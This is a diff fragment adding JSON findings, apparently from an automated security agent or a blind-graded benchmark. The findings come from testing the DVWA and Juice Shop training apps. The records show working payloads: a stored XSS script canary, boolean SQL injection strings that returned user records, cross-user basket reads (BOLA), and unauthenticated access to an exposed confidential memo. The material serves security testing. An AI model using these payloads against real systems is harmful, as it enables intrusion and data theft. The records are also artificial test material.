+    "request_sequence": [
+      "POST /vulnerabilities/xss_s/ txtName=tester&mtxMessage=<script id=\"test_token\">window.xss_flag=1</script>&btnSign=Sign Guestbook (dvwa_admin)",
+      "browser_navigate /vulnerabilities/xss_s/ (dvwa_admin)",
+      "browser_eval_js window.xss_flag"
+    ],
+    "response_evidence": "Canary (50 chars, within mtxMessage maxlength=50) was persisted and rendered on the guestbook page. Browser-side evaluation returned window.xss_flag = 1.",
+    "browser_js_evidence": "window.xss_flag => 1 (on http://dvwa/vulnerabilities/xss_s/ as dvwa_admin)"
+  },
+  {
+    "blind_id": "BLIND-0067",
+    "target": "juiceshop",
+    "endpoint_url": "http://juiceshop:3000/rest/basket/1",
+    "method": "GET",
+    "parameter": "id (path: basket id)",
+    "cwe": "CWE-639",
+    "title": "Cross-user basket access (BOLA) via GET /rest/basket/1 by juiceshop_acct2",
+    "agent_verdict": "confirmed",
+    "request_sequence": [
+      "GET http://juiceshop:3000/rest/basket/6 (session juiceshop_acct1) -> 200, own_basket_id=6, UserId 22, Products: Apple Juice (1000ml) qty 3",
+      "GET http://juiceshop:3000/rest/basket/1 (session juiceshop_acct2, own_basket_id=7) -> 200"
+    ],
+    "response_evidence": "Acct2 (own basket 7) retrieved basket id 1 with \\\"UserId\\\":1 (not acct2's UserId, and not acct1's basket 6 which has UserId 22). Basket 1 contains foreign seeded items: Apple Juice (1000ml) quantity 2 (BasketItem id 1), Orange Juice (1000ml) quantity 3 (BasketItem id 2), Eggfruit Juice (500ml) quantity 1 (BasketItem id 3). Response: {\\\"status\\\":\\\"success\\\",\\\"data\\\":{\\\"id\\\":1,\\\"coupon\\\":null,\\\"UserId\\\":1,...}}. Acct1 basket 6 baseline: Apple Juice (1000ml) qty 3. No ownership check on basket id.",
+    "browser_js_evidence": null
+  },
+  {
+    "blind_id": "BLIND-0068",
+    "target": "dvwa",
+    "endpoint_url": "http://dvwa/vulnerabilities/sqli/",
+    "method": "GET",
+    "parameter": "id",
+    "cwe": "CWE-89",
+    "title": "SQL Injection in DVWA SQLi id parameter (Boolean-based)",
+    "agent_verdict": "confirmed",
+    "request_sequence": [
+      "GET /vulnerabilities/sqli/?id=1' OR '1'='1&Submit=Submit (dvwa_admin)",
+      "GET /vulnerabilities/sqli/?id=1' AND '1'='2&Submit=Submit (dvwa_admin)"
+    ],
+    "response_evidence": "TRUE payload returned 5 user records: admin/admin, Gordon/Brown, Hack/Me, Pablo/Picasso, Bob/Smith. FALSE payload returned zero records (only 'User ID:' label with no First name/Surname rows).",
+    "browser_js_evidence": null
+  },
+  {
+    "blind_id": "BLIND-0069",
+    "target": "juiceshop",
+    "endpoint_url": "http://juiceshop:3000/ftp/acquisitions.md",
+    "method": "GET",
+    "parameter": "path",
+    "cwe": "CWE-200",
+    "title": "Confidential acquisitions memo exposed via open /ftp/ directory listing",
+    "agent_verdict": "confirmed",
+    "request_sequence": [
+      "GET /ftp/ (unauth, Accept: text/html,application/json) - directory listing reveals acquisitions.md",
+      "GET /ftp/acquisitions.md (unauth)"
+    ],
+    "response_evidence": "Directory listing at /ftp/ lists acquisitions.md (909 bytes). Direct GET /ftp/acquisitions.md returned HTTP 200 text/markdown with: '# Planned Acquisitions > This document is confidential! Do not distribute! Our company plans to acquire several competitors within the next year. This will have a significant stock market impact...'",
+    "browser_js_evidence": null
+  },
+  {
+    "blind_id": "BLIND-0070",
+    "target": "juiceshop",
+    "endpoint_url": "http://juiceshop:3000/rest/basket/6",
+    "method": "GET",
+    "parameter": "id (path: basket id)",
+    "cwe": "CWE-639",
+    "title": "Cross-user basket access (BOLA) via GET /rest/basket/{id}",
+    "agent_verdict": "confirmed",
+    "request_sequence": [
+      "GET http://juiceshop:3000/rest/basket/6 (session juiceshop_acct1) -> 200, session_info.own_basket_id=6",
+      "GET http://juiceshop:3000/rest/basket/6 (session juiceshop_acct2, own_basket_id=7) -> 200"
+    ],
+    "response_evidence": "Account 1 own basket (acct1, own_basket_id=6): {\"status\":\"success\",\"data\":{\"id\":6,\"UserId\":22,\"Products\":[{\"id\":1,\"name\":\"Apple Juice (1000ml)\",\"quantity\":3,\"BasketItem\":{\"ProductId\":1,\"BasketId\":6,\"id\":9,\"quantity\":3}}]}}. Account 2 (acct2, own_basket_id=7) requesting basket 6 received HTTP 200 with the identical body: {\"status\":\"success\",\"data\":{\"id\":6,\"UserId\":22,\"Products\":[{\"id\":1,\"name\":\"Apple Juice (1000ml)\", \"BasketItem\":{\"BasketId\":6,\"quantity\":3}}]}}. acct2 retrieved acct1's distinct seeded basket item (Apple Juice (1000ml), quantity 3) without ownership check. Note: the mapper's /rest/basket/1 record (UserId 1 basket) was not separately tested; this verification used acct1's own basket ID 6 as instructed.",
+    "browser_js_evidence": null
+  },
+  {
+    "blind_id": "BLIND-0071",
+    "target": "dvwa",
+    "endpoint_url": "http://dvwa/vulnerabilities/xss_s/",
+    "method": "POST",
+    "parameter": "mtxMessage",
+    "cwe": "CWE-79",
+    "title": "Stored XSS in /vulnerabilities/xss_s/ guestbook message (Low security)",
+    "agent_verdict": "confirmed",
+    "request_sequence": [
+      "POST /vulnerabilities/xss_s/ form txtName=tester, mtxMessage=<script id=\"test_token\">window.xss_flag=1</script>, btnSign=Sign Guestbook (session dvwa_admin)",
+      "browser_navigate http://dvwa/vulnerabilities/xss_s/ (session dvwa_admin)",
+      "browser_eval_js window.xss_flag"
+    ],
+    "response_evidence": "POST accepted (HTTP 200) and the guestbook entry was persisted; the rendering page lists 'Name: tester Message:' entry. Canary is 50 chars and was submitted verbatim into mtxMessage (maxlength 50); txtName=tester (6 chars, within maxlength 10). Stored-XSS execution check in a fresh page load by dvwa_admin returned window.xss_flag = 1.",
+    "browser_js_evidence": "browser_eval_js(\"window.xss_flag\") -> {\"result\": 1, \"current_url\": \"http://dvwa/vulnerabilities/xss_s/\"}"
+  }
+]
